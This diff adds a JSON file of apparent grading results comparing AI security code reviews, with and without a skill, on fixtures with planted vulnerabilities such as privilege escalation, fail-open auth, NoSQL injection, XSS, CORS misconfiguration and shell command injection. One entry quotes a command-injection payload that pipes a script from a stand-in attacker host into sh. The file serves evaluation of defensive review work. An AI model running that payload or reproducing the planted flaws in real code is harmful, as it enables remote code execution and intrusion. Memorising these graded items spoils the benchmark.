@@ -1,0 +1,56 @@
+{
+  "account-service-flows/run-1": {
+    "winner_arm": "without_skill",
+    "with_skill_score": 9.3,
+    "without_skill_score": 9.7,
+    "reasoning": "Both reviews are excellent and both identify the three ship-blocking issues correctly and with verified accuracy: the combined ALLOWED_PROFILE_FIELDS allowlist reaching the unguarded PATCH /me (privilege escalation to admin), the missing `return` statements in requireAuth making the auth barrier fail-open, and normalizeIdentifier passing non-string values straight into User.findOne on the login path (Mongo operator injection). I checked every substantive claim in both against the source and found no fabricated findings on either side. A wins on completeness and shipping-readiness. A reports fi"
+  },
+  "account-service-flows/run-2": {
+    "winner_arm": "without_skill",
+    "with_skill_score": 9.5,
+    "without_skill_score": 9.8,
+    "reasoning": "Both reviews are strong, correct, and reach the same ship/no-ship verdict, and both nail the three defects that actually matter: the mass-assignment privilege escalation via PATCH /me using ALLOWED_PROFILE_FIELDS (verified at profile.routes.js:31 + fields.js:5), the fail-open requireAuth with two missing `return`s and an unconditional next() (auth.js:11-29), and the NoSQL operator injection where /login calls normalizeIdentifier(req.body.email) without the String() coercion /register uses (identifier.js:8 + auth.routes.js:50). I verified every finding in both reports against the source and fou"
+  },
+  "account-service-flows/run-3": {
+    "winner_arm": "without_skill",
+    "with_skill_score": 8.7,
+    "without_skill_score": 9.3,
+    "reasoning": "Both reviews find the three real high-impact defects in this service and both verify cleanly against the source: the fail-open `requireAuth` (middleware/auth.js:11-29 sends 401 without returning, then calls next() unconditionally), the self-service privilege escalation (profile.routes.js:31 picks ALLOWED_PROFILE_FIELDS, which fields.js:5 composes to include role/isActive, on a route with no requireRole guard), and the NoSQL operator injection (identifier.js:8 returns non-strings verbatim into the login filter at auth.routes.js:50-51, while /register at line 30 correctly wraps with String()). B"
+  },
+  "post-page-sanitizer-and-cors/run-1": {
+    "winner_arm": "without_skill",
+    "with_skill_score": 9.3,
+    "without_skill_score": 9.4,
+    "reasoning": "Both reviews find the same top-tier issues and both are unusually strong: the raw `post.body` in `dangerouslySetInnerHTML` at PostView.jsx:65 while the computed `safeBody` goes unused (the central planted bug), the `origin.endsWith(host)` CORS suffix match paired with `credentials: true`, the bypassable `safeUrl` scheme denylist, the unvalidated `coverUrl` in `<img src>`, and the sharp observation that helmet's CSP rides on API JSON responses and so protects nothing on the document origin that actually runs the XSS. I verified each of these against the source and all are true in both write-ups"
+  },
+  "post-page-sanitizer-and-cors/run-2": {
+    "winner_arm": "without_skill",
+    "with_skill_score": 8.7,
+    "without_skill_score": 9.7,
+    "reasoning": "Both outputs identify the same three primary defects, all verified true against the source: (1) PostView.jsx:65 renders raw `post.body` through dangerouslySetInnerHTML while the DOMPurify result `safeBody` is computed and used only for the escaped excerpt; (2) app.js:37 gates CORS with `origin.endsWith(host)` against bare hostnames while `credentials: true`, so `https://evilblogapp.example` is reflected with Access-Control-Allow-Credentials; (3) url.js uses a three-entry scheme denylist with `startsWith` on a trimmed string, defeated by embedded tab/LF/CR that the WHATWG URL parser strips. Bot"
+  },
+  "post-page-sanitizer-and-cors/run-3": {
+    "winner_arm": "with_skill",
+    "with_skill_score": 9.5,
+    "without_skill_score": 8.9,
+    "reasoning": "Both outputs are high quality and both land the three genuine high-impact bugs in the fixture: the raw `post.body` passed to `dangerouslySetInnerHTML` at PostView.jsx:65 while the computed `safeBody` is spent only on the excerpt; the `origin.endsWith(host)` CORS suffix match at app.js:37 paired with `credentials: true`; and the blocklist-shaped `safeUrl` in url.js with its embedded-control-character and unlisted-scheme bypasses. Both trace the data flow rather than pattern-matching, both give correct one-line fixes, and both correctly observe that the Helmet CSP sits on the API origin and ther"
+  },
+  "posts-search-export-flows/run-1": {
+    "winner_arm": "without_skill",
+    "with_skill_score": 9.0,
+    "without_skill_score": 9.3,
+    "reasoning": "Both reviews are strong, correctly identify the two headline vulnerabilities (shell command injection via ?template into exec() in render.js:6, and the vacuous ownership check against req.body.authorId at posts.controller.js:81), and both give accurate, verified exploit chains and correct fixes (execFile + allowlist; compare against req.user.userId). A wins on completeness and severity calibration. A finds three additional real issues that B misses entirely: (1) exportPdf/exportBranded never load or authorize the post, unlike every other read path which enforces isPublished:true \u2014 verified at "
+  },
+  "posts-search-export-flows/run-2": {
+    "winner_arm": "without_skill",
+    "with_skill_score": 9.0,
+    "without_skill_score": 9.7,
+    "reasoning": "Both reviews find the same three core vulnerabilities (exec-based command injection in render.js, the ownership check against req.body.authorId at posts.controller.js:81, and the unescaped user-controlled RegExp in query.js:11) and both propose correct fixes (allowlist + execFile, compare against req.user.userId, escape/bound or use a text index). B wins on verified technical accuracy and coverage. Accuracy: (a) B's command-injection PoC survives path.join, and B explicitly warns that path.join collapses '//' \u2014 A's headline PoC uses '?template=x;curl https://attacker.tld/s.sh|sh;#' and then pr"
+  },
+  "posts-search-export-flows/run-3": {
+    "winner_arm": "with_skill",
+    "with_skill_score": 9.7,
+    "without_skill_score": 9.3,
+    "reasoning": "Both reviews find the same five real defects in the posts service \u2014 command injection via `?template=` reaching `exec()` in render.js, the ownership check at posts.controller.js:81 comparing against attacker-supplied `req.body.authorId`, path traversal out of TEMPLATE_DIR, an unescaped user regex on the unauthenticated and unrate-limited /search route, and export handlers that never load or authorize the post \u2014 and both give correct, working fixes (execFile with an argv array, allowlist, req.user.userId, escapeRegex plus a limiter). A is broader: it adds three genuine low-severity findings B o"
+  }
+}
